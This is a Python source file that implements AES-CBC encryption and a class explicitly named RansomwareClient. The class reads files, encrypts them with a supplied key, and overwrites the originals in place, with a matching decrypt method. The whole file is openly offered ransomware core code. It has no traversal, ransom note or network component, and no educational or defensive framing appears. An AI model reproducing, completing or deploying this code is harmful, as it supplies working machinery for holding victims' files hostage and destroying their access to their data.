import base64
from Crypto import Random
from Crypto.Cipher import AES



class AESCipher:
    '''
    A class that encrypts and decrypts information using a symmetric encryption algorithm (AES).
    '''

    def __init__(self, secret_key: str):
        self.secret_key = base64.b64decode(secret_key.encode())


    def pad(self, data: bytes, block_size: int = 16) -> bytes:
        '''
        The function organizes the data using padding so that it can be encrypted with symmetric encryption.
        '''
        pad_len = block_size - (len(data) % block_size)
        return data + bytes([pad_len]) * pad_len


    def unpad(self, padded_text: bytes, block_size: int = 16) -> bytes:
        '''
        The function removes the padding used in encryption to decrypt the information.
        '''
        pad_len = padded_text[-1]
        if pad_len < 1 or pad_len > block_size:
            raise ValueError("bad padding!")
        
        if padded_text[-pad_len:] != bytes([pad_len]) * pad_len:
            raise ValueError("bad padding!")
        
        return padded_text[:-pad_len]


    def encrypt(self, plaintext: bytes) -> bytes:
        '''
        The function creates a random initialization vector that is drawn to the specified size and uses it to encrypt the data.
        '''
        # Padding the data
        plaintext = self.pad(plaintext)

        # IV creates randomness for the encryption process, ensuring that even if the same plaintext is encrypted multiple times with the same key, the resulting ciphertext will be different each time
        iv = Random.new().read(AES.block_size)

        # Creating an AES cipher object
        cipher = AES.new(self.secret_key, AES.MODE_CBC, iv)
        # Encrypting the data in base 64
        return base64.b64encode(iv + cipher.encrypt(plaintext))


    def decrypt(self, encrypted_data: bytes) -> bytes:
        '''
        The function does the "reverse" steps of the encryption function and thus decrypts the information.
        '''
        # Decrypting base 64 data encryption
        encrypted_data = base64.b64decode(encrypted_data)
        # cutting the IV
        iv = encrypted_data[:AES.block_size]
        # Truncation to save only the data in a variable
        encrypted_data = encrypted_data[AES.block_size:]

        # Creating an AES cipher object
        cipher = AES.new(self.secret_key, AES.MODE_CBC, iv)

        # Unpadding the data
        plaintext = self.unpad(cipher.decrypt(encrypted_data))
        return plaintext



class RansomwareClient:
    '''
    The class composes the AESCipher class, reads files, encrypts and decrypts them, and writes the information to them.
    '''

    def __init__(self, key: str):
        self.cipher = AESCipher(key)


    def encrypt_file(self, file_path: str):
        '''
        The function encrypts a file.
        '''
        # Reading the file
        plaintext = self.read_file(file_path)
        # data encryption
        encrypted_text = self.cipher.encrypt(plaintext)
        # Writing the encrypted data to a file instead of the existing data
        self.write_file(file_path, encrypted_text)


    def decrypt_file(self, file_path: str):
        '''
        The function decrypts a file.
        '''
        # Reading the file
        encrypted_text = self.read_file(file_path)
        # Decoding the data
        plaintext = self.cipher.decrypt(encrypted_text)
        # Writing the decrypted data to a file instead of the existing data
        self.write_file(file_path, plaintext)


    def read_file(self, file_path: str) -> bytes:
        '''
        The function reads the information from the file.
        '''
        with open(file_path, "rb") as file:
            return file.read()


    def write_file(self, file_path: str, content: bytes):
        '''
        The function writes the encrypted information into the file.
        '''
        with open(file_path, "wb") as file:
            file.write(content)